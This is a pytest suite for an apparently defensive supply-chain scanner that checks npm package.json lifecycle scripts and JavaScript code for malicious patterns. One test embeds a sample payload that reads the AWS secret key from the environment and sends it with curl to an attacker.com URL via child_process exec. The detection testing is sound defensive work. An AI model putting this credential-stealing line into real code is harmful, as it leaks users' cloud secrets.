"""
SupplyShield - Day 10: Multi-Language JS & npm Manifest Test Suite
Tests Node.js package.json lifecycle script analysis, dangerous CLI command detection,
JavaScript dynamic code evaluation, and FastAPI POST /api/scan/npm endpoint.
"""

import os
import pytest
from fastapi.testclient import TestClient
try:
    from backend.main import app
    from backend.engine.javascript_analyzer import analyze_npm_manifest, analyze_javascript_code
except ImportError:
    from main import app
    from engine.javascript_analyzer import analyze_npm_manifest, analyze_javascript_code


client = TestClient(app)

SAMPLES_DIR = os.path.join(os.path.dirname(__file__), "samples")
SAFE_NPM_MANIFEST = os.path.join(SAMPLES_DIR, "npm_safe_package.json")
MALICIOUS_NPM_MANIFEST = os.path.join(SAMPLES_DIR, "npm_malicious_postinstall.json")


def test_safe_npm_manifest_analysis():
    """Verifies that clean npm package manifests pass with zero risk score and CLEAN verdict."""
    with open(SAFE_NPM_MANIFEST, "r", encoding="utf-8") as f:
        content = f.read()

    result = analyze_npm_manifest(content)
    assert result["success"] is True
    assert result["verdict"] == "CLEAN"
    assert result["risk_score"] == 0
    assert len(result["findings"]) == 0


def test_malicious_npm_manifest_analysis():
    """Verifies detection of curl|bash execution in npm postinstall lifecycle hook."""
    with open(MALICIOUS_NPM_MANIFEST, "r", encoding="utf-8") as f:
        content = f.read()

    result = analyze_npm_manifest(content)
    assert result["success"] is True
    assert result["verdict"] in ["CRITICAL_MALICIOUS", "SUSPICIOUS"]
    assert result["risk_score"] > 0
    assert any(f["rule_id"] == "JS-LIFE-001" for f in result["findings"])


def test_javascript_code_analysis():
    """Verifies detection of eval() and child_process execution in JS source code."""
    js_payload = """
    const { exec } = require('child_process');
    const secretKey = process.env.AWS_SECRET_ACCESS_KEY;
    eval("console.log('pwned')");
    exec("curl http://attacker.com/steal?key=" + secretKey);
    """

    result = analyze_javascript_code(js_payload, filename="malicious.js")
    assert result["success"] is True
    assert result["verdict"] in ["CRITICAL_MALICIOUS", "SUSPICIOUS"]
    assert any(f["rule_id"] == "JS-DYN-001" for f in result["findings"])
    assert any(f["rule_id"] == "JS-SYS-001" for f in result["findings"])


def test_api_scan_npm_endpoint():
    """Verifies FastAPI POST /api/scan/npm file upload endpoint."""
    with open(MALICIOUS_NPM_MANIFEST, "rb") as f:
        response = client.post(
            "/api/scan/npm",
            files={"file": ("package.json", f, "application/json")}
        )

    assert response.status_code == 200
    data = response.json()
    assert data["success"] is True
    assert data["filename"] == "package.json"
    assert data["result"]["verdict"] in ["CRITICAL_MALICIOUS", "SUSPICIOUS"]
